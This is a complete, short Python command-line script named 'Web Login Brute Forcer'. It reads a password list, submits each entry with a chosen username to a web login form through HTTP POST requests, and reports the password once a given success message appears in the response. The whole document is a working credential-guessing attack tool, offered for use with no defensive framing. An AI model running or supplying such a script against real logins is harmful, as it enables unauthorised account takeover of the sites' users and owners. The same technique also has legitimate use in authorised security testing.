import requests
import sys

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Web Login Brute Forcer")
    parser.add_argument("address", help="Hostname or IP Address of Web Login to bruteforce.")
    parser.add_argument("-P", "--passlist", help="File that contains password list on each line.")
    parser.add_argument("-u", "--user", help="Username to bruteforce")
    parser.add_argument("-m", "--message", help="Message shown in case of successfull login.")

    args = parser.parse_args()
    address = args.address
    passlist = args.passlist
    user = args.user
    success_message = args.message

    with open(passlist, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n").encode()
            sys.stdout.write("\n[X] Attempting credentials -> {}:{}\r".format(user, password.decode()))
            sys.stdout.flush()
            response = requests.post(address, data={"username": user, "password": password,})
            if success_message.encode() in response.content:
                sys.stdout.write("\n[>>>>>] Valid password '{}' found for user '{}'!\n".format(password.decode(), user))
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\n\tNo password found for '{}'!\n".format(user))
